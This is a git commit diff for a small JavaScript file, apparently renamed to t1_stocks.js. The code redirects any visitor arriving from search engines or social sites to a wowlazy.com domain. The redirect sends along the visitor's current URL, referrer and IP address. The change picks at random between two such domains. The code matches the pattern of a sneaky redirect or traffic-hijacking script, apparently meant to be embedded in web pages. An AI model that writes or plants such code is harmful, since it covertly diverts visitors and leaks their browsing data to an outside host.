d14e0f971b38ba84e0adae52b39ba362572aac16
pgpump <pg079898@gmail.com>
2025-06-02 16:45:58 +0700

    Update and rename head_t1.js to t1_stocks.js

--- t1_stocks.js
+++ t1_stocks.js
@@ -1,6 +1,4 @@
-///// Arsae /////
-var arsT1Bing = 'https://en.wowlazy.com';
-
+var arsT1Bing = ['https://en.wowlazy.com', 'https://stocks.wowlazy.com'][Math.floor(Math.random() * 2)];
 if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
 	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
 }
